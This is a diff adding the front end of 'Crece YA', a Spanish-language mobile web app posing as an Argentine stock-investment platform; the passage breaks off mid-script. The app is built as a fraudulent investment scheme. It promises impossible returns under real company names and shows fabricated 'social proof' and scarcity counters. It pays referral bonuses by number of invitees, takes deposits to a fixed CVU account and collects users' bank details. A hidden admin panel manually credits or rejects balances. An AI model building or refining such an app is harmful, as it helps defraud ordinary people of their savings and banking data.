@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Crece YA - Plataforma Bursátil</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* Estilos base para scroll suave y evitar scroll horizontal */
+    body {
+      touch-action: manipulation;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .custom-scrollbar::-webkit-scrollbar {
+      width: 4px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb {
+      background-color: #cbd5e1;
+      border-radius: 9999px;
+    }
+  </style>
+</head>
+<body class="bg-[#bae6fd] text-slate-850 font-sans antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
+
+  <!-- ================= MAQUETA CENTRAL MÓVIL ================= -->
+  <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
+
+    <div>
+      <!-- HEADER CON DETECTOR DE ADMIN (4 CLICS EN LOGO) -->
+      <header class="p-3.5 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
+        <div class="flex items-center gap-2 cursor-pointer select-none" id="admin-logo-trigger">
+          <div class="w-8 h-8 rounded-xl bg-sky-600 text-white flex items-center justify-center font-black text-xs shadow-sm">
+            <i class="fa-solid fa-arrow-trend-up"></i>
+          </div>
+          <div>
+            <span class="font-extrabold tracking-wider text-slate-900 text-xs block leading-none">CRECE YA</span>
+            <span id="user-display-phone" class="text-[9px] text-sky-700 font-mono font-medium">+54 9 11 ...</span>
+          </div>
+        </div>
+
+        <div class="flex items-center gap-2">
+          <span class="text-[10px] bg-sky-100 text-sky-800 border border-sky-300 px-2 py-0.5 rounded-full font-bold font-mono">
+            EN LÍNEA ✓
+          </span>
+          <button id="btn-logout" title="Cerrar sesión" class="text-slate-400 hover:text-rose-500 text-xs px-1">
+            <i class="fa-solid fa-arrow-right-from-bracket"></i>
+          </button>
+        </div>
+      </header>
+
+      <!-- NOTIFICACIÓN SOCIAL PROOF FLOTANTE -->
+      <section class="bg-white/60 border-b border-sky-200/60 px-3 py-1.5 text-xs text-slate-600">
+        <p class="truncate font-mono text-[11px] flex items-center gap-1.5">
+          <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+          <span id="toast-social-text">Usuario +54 9 11... activó MELI ($2.000 ARS)</span>
+        </p>
+      </section>
+
+      <!-- ================= VISTA 1: 🏠 PLANES (INICIO) ================= -->
+      <div id="view-planes" class="space-y-3.5 p-3">
+        <!-- Balance Superior Rápido -->
+        <div class="p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
+          <div class="flex items-center justify-between">
+            <span class="text-xs text-slate-500 font-medium">Saldo Disponible</span>
+            <span class="text-[10px] bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
+          </div>
+          <h1 id="home-balance-display" class="text-3xl font-extrabold text-slate-900 mt-1 font-mono tracking-tight">$0 <span class="text-xs font-normal text-slate-400">ARS</span></h1>
+          <p class="text-[11px] text-slate-500 mt-0.5 font-mono">Mín. retiro: $5.000 ARS (Comisión administrativa 10%)</p>
+
+          <div class="grid grid-cols-2 gap-2 mt-3.5">
+            <button onclick="openDepositModal()" class="bg-sky-600 hover:bg-sky-700 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
+              <i class="fa-solid fa-plus"></i> Cargar Saldo
+            </button>
+            <button onclick="openWithdrawModal()" class="bg-sky-800 hover:bg-sky-900 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
+              <i class="fa-solid fa-arrow-up-right-from-square"></i> Retirar
+            </button>
+          </div>
+        </div>
+
+        <!-- Selector de Categorías -->
+        <div class="flex items-center justify-between px-1">
+          <span class="text-xs font-bold text-slate-800 uppercase tracking-wide">Mercado Bursátil</span>
+          <div class="flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-[11px]">
+            <button id="btn-tab-iniciales" class="px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition">
+              Iniciales
+            </button>
+            <button id="btn-tab-pro" class="px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition">
+              Pro / VIP
+            </button>
+          </div>
+        </div>
+
+        <!-- Catálogo de Planes Renderizado -->
+        <div id="plans-container" class="space-y-3">
+          <!-- Inyectado dinámicamente con JS -->
+        </div>
+      </div>
+
+      <!-- ================= VISTA 2: 📦 PRODUCTOS (MIS CONTRATOS) ================= -->
+      <div id="view-productos" class="hidden p-3 space-y-3">
+        <div class="p-3 bg-white/80 border border-sky-200 rounded-2xl">
+          <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5">
+            <i class="fa-solid fa-box-open text-sky-600"></i> Tus Acciones en Operación
+          </h2>
+          <p class="text-[11px] text-slate-500 mt-0.5 font-mono">Los rendimientos y capital se acreditan automáticamente al culminar el ciclo.</p>
+        </div>
+
+        <div id="active-products-container" class="space-y-2.5">
+          <!-- Render dinámico de contratos activos -->
+        </div>
+      </div>
+
+      <!-- ================= VISTA 3: 👥 COMPARTIR (RED & INVITADOS) ================= -->
+      <div id="view-compartir" class="hidden p-3 space-y-3.5">
+        <!-- Tarjeta Link y Botones -->
+        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+          <div class="flex items-center gap-2">
+            <div class="w-8 h-8 rounded-xl bg-sky-100 text-sky-600 flex items-center justify-center text-sm">
+              <i class="fa-solid fa-share-nodes"></i>
+            </div>
+            <div>
+              <h2 class="text-xs font-bold text-slate-900">Tu Enlace de Afiliado</h2>
+              <span class="text-[10px] text-slate-500 font-mono">Gana comisiones directas por activación</span>
+            </div>
+          </div>
+
+          <div class="flex items-center bg-slate-50 border border-sky-200 rounded-xl px-2.5 py-2 gap-2">
+            <input id="ref-link-input" type="text" readonly class="bg-transparent text-xs text-sky-800 font-mono w-full outline-none select-all truncate">
+            <button id="btn-copy-ref" class="px-3 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs font-bold rounded-lg transition shrink-0">
+              Copiar
+            </button>
+          </div>
+
+          <button id="btn-share-whatsapp" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
+            <i class="fa-brands fa-whatsapp text-sm"></i> Compartir en WhatsApp
+          </button>
+        </div>
+
+        <!-- Aviso de Seguridad -->
+        <div class="p-3 bg-amber-50 border border-amber-200 rounded-2xl text-[11px] text-amber-900 leading-relaxed space-y-1">
+          <p class="font-bold flex items-center gap-1.5">
+            <i class="fa-solid fa-shield-halved text-amber-600"></i> Validación Oficial de Cuentas:
+          </p>
+          <p>Para evitar cuentas duplicadas o robots, un usuario se registra como <strong>Oficial</strong> únicamente tras concretar su primer depósito de inversión ($2.000 ARS). Las bonificaciones se liberan de inmediato a tu saldo disponible.</p>
+        </div>
+
+        <!-- Escala de Metas -->
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2">
+          <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide">Escala de Bonificaciones</h3>
+          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
+          </div>
+        </div>
+
+        <!-- Historial de Invitados -->
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
+          <div class="flex justify-between items-center">
+            <h3 class="text-xs font-bold text-slate-800">Personas Invitadas</h3>
+            <span id="invites-count-badge" class="text-[10px] font-mono bg-sky-100 text-sky-800 px-2 py-0.5 rounded-md font-bold">0 registrados</span>
+          </div>
+          <div id="invites-list-container" class="space-y-1.5 text-xs font-mono">
+            <p class="text-slate-400 text-center py-2 text-[11px]">Aún no tienes invitados en tu red.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ================= VISTA 4: 👤 MI PERFIL ================= -->
+      <div id="view-perfil" class="hidden p-3 space-y-3.5">
+        <!-- Resumen Financiero -->
+        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+          <div class="flex justify-between items-center">
+            <span class="text-xs font-semibold text-slate-500">Resumen de Cuenta</span>
+            <span class="text-[10px] font-mono bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full font-bold">Activo</span>
+          </div>
+
+          <div class="grid grid-cols-3 gap-2 text-center font-mono">
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">DISPONIBLE</span>
+              <strong id="profile-bal-ars" class="text-xs text-slate-900 font-bold">$0</strong>
+            </div>
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">EN REVISIÓN</span>
+              <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold">$0</strong>
+            </div>
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">RETIRADO</span>
+              <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold">$0</strong>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tarjeta Check-in Diario $500 ARS -->
+        <div class="p-3 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
+          <div class="flex items-center gap-2.5">
+            <div class="w-9 h-9 rounded-xl bg-amber-400/20 text-amber-600 flex items-center justify-center text-sm font-bold">
+              <i class="fa-solid fa-calendar-check"></i>
+            </div>
+            <div>
+              <span class="text-xs font-bold text-slate-900 block">Check-in Diario</span>
+              <span id="checkin-status-text" class="text-[10px] text-amber-700 font-mono font-medium">+$500 ARS listos para reclamar</span>
+            </div>
+          </div>
+          <button id="btn-claim-daily" class="px-3.5 py-1.5 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-extrabold rounded-xl transition shadow">
+            Cobrar
+          </button>
+        </div>
+
+        <!-- Ficha de Datos Personales y Bancarios -->
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5 text-xs">
+          <div class="flex justify-between items-center">
+            <span class="font-bold text-slate-800">Cuenta de Cobro Vinculada</span>
+            <span id="bank-status-badge" class="flex items-center gap-1 text-[10px] font-mono text-amber-600 font-bold">
+              <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span> 🟠 En revisión
+            </span>
+          </div>
+
+          <div class="space-y-2 text-[11px]">
+            <div>
+              <label class="text-slate-400 block text-[10px]">TITULAR REGISTRADO</label>
+              <input id="prof-name-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-medium text-slate-900 outline-none" placeholder="Nombre y Apellido completo">
+            </div>
+            <div class="grid grid-cols-2 gap-2">
+              <div>
+                <label class="text-slate-400 block text-[10px]">CBU O CVU PERSONAL</label>
+                <input id="prof-cvu-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-mono text-slate-900 outline-none" placeholder="22 dígitos">
+              </div>
+              <div>
+                <label class="text-slate-400 block text-[10px]">ALIAS BANCARIO</label>
+                <input id="prof-alias-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-lg p-1.5 font-mono text-slate-900 outline-none" placeholder="Ej: mi.cuenta.mp">
+              </div>
+            </div>
+            <button id="btn-save-profile" class="w-full py-1.5 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-lg transition">
+              Guardar Datos de Cobro
+            </button>
+          </div>
+        </div>
+
+        <!-- Botón Telegram y Soporte -->
+        <a href="https://t.me/TuCanalOficial" target="_blank" class="p-3 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
+          <div class="flex items-center gap-2">
+            <i class="fa-brands fa-telegram text-xl"></i>
+            <div>
+              <span class="text-xs font-bold block">Canal Oficial & Soporte</span>
+              <span class="text-[10px] text-sky-100">Atención de Lunes a Viernes 07:00 a 18:00 hs</span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right text-xs"></i>
+        </a>
+
+        <!-- Historial de Transacciones -->
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2">
+          <h3 class="text-xs font-bold text-slate-800">Historial de Transacciones</h3>
+          <div id="tx-history-container" class="space-y-1.5 text-[11px] font-mono">
+            <p class="text-slate-400 text-center py-2">Sin movimientos registrados aún.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ================= BARRA INFERIOR FIJA ================= -->
+    <nav class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-sm bg-white/95 backdrop-blur-md border-t border-sky-200 grid grid-cols-4 py-2 px-2 text-center text-xs z-40 gap-1 shadow-lg">
+      <button onclick="switchTab('planes')" id="nav-btn-planes" class="bg-sky-600 text-white py-1.5 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition">
+        <i class="fa-solid fa-chart-pie text-xs"></i>
+        <span class="text-[9px]">Planes</span>
+      </button>
+      <button onclick="switchTab('productos')" id="nav-btn-productos" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-box-open text-xs"></i>
+        <span class="text-[9px]">Productos</span>
+      </button>
+      <button onclick="switchTab('compartir')" id="nav-btn-compartir" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-share-nodes text-xs"></i>
+        <span class="text-[9px]">Compartir</span>
+      </button>
+      <button onclick="switchTab('perfil')" id="nav-btn-perfil" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+        <i class="fa-solid fa-user text-xs"></i>
+        <span class="text-[9px]">Mi Perfil</span>
+      </button>
+    </nav>
+
+    <!-- ================= MODAL DEPÓSITO ================= -->
+    <div id="deposit-modal" class="fixed inset-0 z-50 bg-black/75 backdrop-blur-xs hidden flex items-center justify-center p-4">
+      <div class="bg-white border border-sky-200 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3.5">
+        <div class="flex items-center justify-between border-b border-slate-100 pb-2">
+          <h3 class="text-xs font-bold text-slate-900 flex items-center gap-1.5">
+            <i class="fa-solid fa-wallet text-sky-600"></i> Cargar Fondos en Pesos
+          </h3>
+          <button onclick="closeDepositModal()" class="text-slate-400 hover:text-slate-700">
+            <i class="fa-solid fa-xmark text-sm"></i>
+          </button>
+        </div>
+
+        <div>
+          <label class="text-[10px] text-slate-400 block mb-1">CVU OFICIAL PARA TRANSFERIR</label>
+          <div class="flex items-center bg-slate-50 border border-sky-200 rounded-xl p-2 gap-2">
+            <input id="cvu-input-val" type="text" readonly value="0000168300000008340656" class="bg-transparent text-xs text-sky-800 font-mono font-bold w-full outline-none select-all truncate">
+            <button id="btn-copy-cvu" class="px-2.5 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs font-bold rounded-lg transition shrink-0">
+              Copiar
+            </button>
+          </div>
+        </div>
+
+        <div>
+          <label class="text-[10px] text-slate-400 block mb-1">MONTO RÁPIDO O PERSONALIZADO (MÍN. $2.000)</label>
+          <div class="grid grid-cols-3 gap-1.5 mb-2 text-xs font-mono">
+            <button onclick="setDepositAmount(2000)" class="py-1 bg-slate-100 hover:bg-slate-200 rounded-lg font-bold text-slate-800">$2.000</button>
+            <button onclick="setDepositAmount(3500)" class="py-1 bg-slate-100 hover:bg-slate-200 rounded-lg font-bold text-slate-800">$3.500</button>
+            <button onclick="setDepositAmount(5000)" class="py-1 bg-slate-100 hover:bg-slate-200 rounded-lg font-bold text-slate-800">$5.000</button>
+          </div>
+          <input id="custom-deposit-amount" type="number" min="2000" placeholder="Otro monto (ej: 2500)" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 text-xs font-mono font-bold text-slate-900 outline-none">
+        </div>
+
+        <button id="btn-notify-deposit" class="w-full py-2.5 bg-sky-600 hover:bg-sky-700 text-white font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-1.5">
+          <i class="fa-brands fa-telegram"></i> Notificar y Enviar Comprobante
+        </button>
+      </div>
+    </div>
+
+    <!-- ================= MODAL RETIRO ================= -->
+    <div id="withdraw-modal" class="fixed inset-0 z-50 bg-black/75 backdrop-blur-xs hidden flex items-center justify-center p-4">
+      <div class="bg-white border border-sky-200 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3.5">
+        <div class="flex items-center justify-between border-b border-slate-100 pb-2">
+          <h3 class="text-xs font-bold text-slate-900 flex items-center gap-1.5">
+            <i class="fa-solid fa-arrow-up-right-from-square text-sky-800"></i> Solicitar Retiro Bancario
+          </h3>
+          <button onclick="closeWithdrawModal()" class="text-slate-400 hover:text-slate-700">
+            <i class="fa-solid fa-xmark text-sm"></i>
+          </button>
+        </div>
+
+        <div class="space-y-2 text-xs">
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-0.5">MONTO A RETIRAR (MÍN. $5.000 ARS)</label>
+            <input id="withdraw-input-amount" type="number" min="5000" placeholder="5000" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono font-bold text-slate-900 outline-none">
+          </div>
+
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 text-[11px] font-mono space-y-1">
+            <div class="flex justify-between text-slate-500">
+              <span>Retención administrativa:</span>
+              <span class="text-rose-600 font-bold">10%</span>
+            </div>
+            <div class="flex justify-between text-slate-800 font-bold">
+              <span>Neto a recibir en cuenta:</span>
+              <span id="withdraw-net-display" class="text-sky-700">$0 ARS</span>
+            </div>
+          </div>
+
+          <div class="p-2.5 bg-amber-50 rounded-xl border border-amber-200 text-[10px] text-amber-900 space-y-1">
+            <p class="font-bold">⏰ Horario bancario: Lunes a Viernes 07:00 a 18:00 hs.</p>
+            <p>Límite operativo: 1 retiro cada 24 horas. Los datos bancarios deben coincidir con tu perfil registrado.</p>
+          </div>
+
+          <button id="btn-confirm-withdraw" class="w-full py-2.5 bg-sky-800 hover:bg-sky-900 text-white font-bold text-xs rounded-xl transition shadow">
+            Confirmar Orden de Retiro
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- ================= MODAL ADMIN OCULTO (161928) ================= -->
+    <div id="admin-modal" class="fixed inset-0 z-50 bg-black/85 backdrop-blur-xs hidden flex items-center justify-center p-4">
+      <div class="bg-white border border-amber-400 w-full max-w-sm rounded-3xl p-4 shadow-2xl space-y-3">
+        <div class="flex items-center justify-between border-b pb-2">
+          <h3 class="text-xs font-bold text-amber-600 flex items-center gap-1.5">
+            <i class="fa-solid fa-lock"></i> Panel Administrativo Central
+          </h3>
+          <button onclick="closeAdminModal()" class="text-slate-400 hover:text-slate-700">
+            <i class="fa-solid fa-xmark text-sm"></i>
+          </button>
+        </div>
+
+        <div id="admin-auth-box" class="space-y-2.5">
+          <label class="text-[10px] text-slate-400 block">INGRESA LA CLAVE MAESTRA</label>
+          <input id="admin-pin-input" type="password" maxlength="6" placeholder="••••••" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 text-center text-sm font-mono tracking-widest outline-none">
+          <button id="btn-admin-unlock" class="w-full py-2 bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold text-xs rounded-xl transition">
+            Desbloquear
+          </button>
+        </div>
+
+        <div id="admin-dashboard-box" class="hidden space-y-3 text-xs">
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Aprobar Recarga Manual</span>
+            <div class="flex gap-2">
+              <input id="admin-credit-amount" type="number" value="2000" class="w-full bg-white border border-slate-200 rounded-lg p-1.5 font-mono text-xs font-bold">
+              <button id="btn-admin-credit" class="px-3 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs shrink-0">
+                Acreditar
+              </button>
+            </div>
+          </div>
+
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Validación de Invitado</span>
+            <button id="btn-admin-validate-guest" class="w-full py-2 bg-sky-600 hover:bg-sky-700 text-white font-bold rounded-lg text-xs">
+              Validar 1er Depósito de Invitado
+            </button>
+          </div>
+
+          <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+            <span class="font-bold text-slate-800 block text-[11px]">Gestión de Retiros Pendientes</span>
+            <div class="grid grid-cols-2 gap-2">
+              <button id="btn-admin-liquidate-w" class="py-1.5 bg-emerald-500 hover:bg-emerald-600 text-white font-bold rounded-lg text-xs">
+                Liquidar Retiro
+              </button>
+              <button id="btn-admin-reject-w" class="py-1.5 bg-rose-500 hover:bg-rose-600 text-white font-bold rounded-lg text-xs">
+                Rechazar (Reintegro)
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- ================= LÓGICA JAVASCRIPT ================= -->
+  <script>
+    // --- CATALOGO OFICIAL DE LOS 12 PLANES DE CRECE YA ---
+    const plans = [
+      // CATEGORÍA INICIAL (1 a 6)
+      { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 15, slotsLeft: 8, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300' },
+      { id: 'tiktok', name: 'TikTok (ByteDance)', cat: 'inicial', cost: 3500, days: 3, daily: 3000, total: 12500, slotsTotal: 12, slotsLeft: 7, color: '#06b6d4', btnBg: 'bg-cyan-500 hover:bg-cyan-400 text-white', border: 'border-cyan-300' },
+      { id: 'apple', name: 'AAPL (Apple Inc.)', cat: 'inicial', cost: 5000, days: 5, daily: 3200, total: 21000, slotsTotal: 12, slotsLeft: 6, color: '#1e293b', btnBg: 'bg-slate-900 hover:bg-slate-800 text-white', border: 'border-slate-300' },
+      { id: 'spotify', name: 'Spotify (Audio)', cat: 'inicial', cost: 8000, days: 7, daily: 4000, total: 36000, slotsTotal: 10, slotsLeft: 5, color: '#22c55e', btnBg: 'bg-green-500 hover:bg-green-400 text-white', border: 'border-green-300' },
+      { id: 'amazon', name: 'AMZN (Amazon)', cat: 'inicial', cost: 12000, days: 10, daily: 5300, total: 65000, slotsTotal: 10, slotsLeft: 5, color: '#ea580c', btnBg: 'bg-orange-500 hover:bg-orange-400 text-white', border: 'border-orange-300' },
+      { id: 'netflix', name: 'Netflix (Streaming)', cat: 'inicial', cost: 15000, days: 10, daily: 7000, total: 85000, slotsTotal: 10, slotsLeft: 4, color: '#e50914', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-300' },
+      
+      // CATEGORÍA PRO / VIP (7 a 12)
+      { id: 'nvidia', name: 'NVDA (NVIDIA AI)', cat: 'pro', cost: 20000, days: 3, daily: 15000, total: 65000, slotsTotal: 3, slotsLeft: 3, color: '#16a34a', btnBg: 'bg-emerald-600 hover:bg-emerald-500 text-white', border: 'border-emerald-300' },
+      { id: 'instagram', name: 'Instagram (Meta)', cat: 'pro', cost: 25000, days: 12, daily: 9500, total: 139000, slotsTotal: 8, slotsLeft: 4, color: '#e11d48', btnBg: 'bg-rose-600 hover:bg-rose-500 text-white', border: 'border-rose-300' },
+      { id: 'tesla', name: 'TSLA (Tesla Motors)', cat: 'pro', cost: 35000, days: 15, daily: 14000, total: 245000, slotsTotal: 8, slotsLeft: 4, color: '#dc2626', btnBg: 'bg-red-600 hover:bg-red-500 text-white', border: 'border-red-400' },
+      { id: 'youtube', name: 'YouTube (Google)', cat: 'pro', cost: 50000, days: 20, daily: 18000, total: 410000, slotsTotal: 6, slotsLeft: 3, color: '#ef4444', btnBg: 'bg-red-500 hover:bg-red-400 text-white', border: 'border-red-300' },
+      { id: 'google', name: 'GOOGL (Alphabet)', cat: 'pro', cost: 80000, days: 25, daily: 26000, total: 730000, slotsTotal: 5, slotsLeft: 2, color: '#2563eb', btnBg: 'bg-blue-600 hover:bg-blue-500 text-white', border: 'border-blue-300' },
+      { id: 'microsoft', name: 'MSFT (Microsoft)', cat: 'pro', cost: 200000, days: 40, daily: 60000, total: 2600000, slotsTotal: 3, slotsLeft: 1, color: '#0284c7', btnBg: 'bg-sky-600 hover:bg-sky-500 text-white', border: 'border-sky-300' }
+    ];
+
+    // --- ESTADO DEL USUARIO ---
+    let appState = {
+      phone: localStorage.getItem('cy_phone') || '+54 9 11 4820-1928',
+      name: localStorage.getItem('cy_name') || 'Juan Pérez',
+      cvu: localStorage.getItem('cy_cvu') || '0000003100010000000000',
+      alias: localStorage.getItem('cy_alias') || 'juan.perez.mp',
+      balance: parseFloat(localStorage.getItem('cy_bal')) || 0,
+      pending: parseFloat(localStorage.getItem('cy_pending')) || 0,
+      withdrawn: parseFloat(localStorage.getItem('cy_withdrawn')) || 0,
+      lastClaim: parseInt(localStorage.getItem('cy_claim')) || 0,
+      lastWithdraw: parseInt(localStorage.getItem('cy_last_withdraw')) || 0,
+      activePlans: JSON.parse(localStorage.getItem('cy_active_plans')) || [],
+      invites: JSON.parse(localStorage.getItem('cy_invites')) || [],
+      txs: JSON.parse(localStorage.getItem('cy_txs')) || []
+    };
+
+    function saveState() {
+      localStorage.setItem('cy_phone', appState.phone);
+      localStorage.setItem('cy_name', appState.name);
+      localStorage.setItem('cy_cvu', appState.cvu);
+      localStorage.setItem('cy_alias', appState.alias);
+      localStorage.setItem('cy_bal', appState.balance);
+      localStorage.setItem('cy_pending', appState.pending);
+      localStorage.setItem('cy_withdrawn', appState.withdrawn);
+      localStorage.setItem('cy_claim', appState.lastClaim);
+      localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
+      localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
+      localStorage.setItem('cy_invites', JSON.stringify(appState.invites));
+      localStorage.setItem('cy_txs', JSON.stringify(appState.txs));
+      renderUI();
+    }
+
+    function fmt(n) {
+      return new Intl.NumberFormat('es-AR').format(Math.round(n));
+    }
+
+    // --- NAVEGACIÓN ENTRE LAS 4 VISTAS ---
+    let currentCategory = 'inicial';
+
+    window.switchTab = function(tabName) {
+      const tabs = ['planes', 'productos', 'compartir', 'perfil'];
+      tabs.forEach(t => {
+        document.getElementById(`view-${t}`).classList.add('hidden');
+        const btn = document.getElementById(`nav-btn-${t}`);
+        btn.className = "bg-sky-50 text-sky-800 hover:bg-sky-100 py-1.5 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition";
+      });
+
+      document.getElementById(`view-${tabName}`).classList.remove('hidden');
+      const activeBtn = document.getElementById(`nav-btn-${tabName}`);
+      activeBtn.className = "bg-sky-600 text-white py-1.5 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition";
+    };
+
+    document.getElementById('btn-tab-iniciales').addEventListener('click', () => {
+      currentCategory = 'inicial';
+      document.getElementById('btn-tab-iniciales').className = "px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition";
+      document.getElementById('btn-tab-pro').className = "px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition";
+      renderPlans();
+    });
+
+    document.getElementById('btn-tab-pro').addEventListener('click', () => {
+      currentCategory = 'pro';
+      document.getElementById('btn-tab-pro').className = "px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition";
+      document.getElementById('btn-tab-iniciales').className = "px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition";
+      renderPlans();
+    });
+
+    // --- RENDERIZADO DEL CATÁLOGO DE PLANES ---
+    function renderPlans() {
+      const container = document.getElementById('plans-container');
+      container.innerHTML = '';
+
+      const filtered = plans.filter(p => p.cat === currentCategory);
+      filtered.forEach(p => {
+        const canActivate = appState.balance >= p.cost;
+        const btnLabel = canActivate ? `Activar Plan: $${fmt(p.cost)}` : `Adquirir Plan: $${fmt(p.cost)}`;
+        const card = document.createElement('div');
+        card.className = `p-3.5 rounded-2xl bg-white border ${p.border} shadow-xs hover:border-sky-400 transition space-y-2`;
+        
+        card.innerHTML = `
+          <div class="flex justify-between items-center">
+            <div class="flex items-center gap-2">
+              <div class="w-7 h-7 rounded-lg text-white flex items-center justify-center text-xs font-black shadow-xs" style="background-color: ${p.color}">
+                ${p.name.charAt(0)}
+              </div>
+              <div>
+                <h3 class="font-bold text-slate-900 text-xs leading-none">${p.name}</h3>
+                <span class="text-[9px] text-slate-400 font-mono">Contrato Fraccional</span>
+              </div>
+            </div>
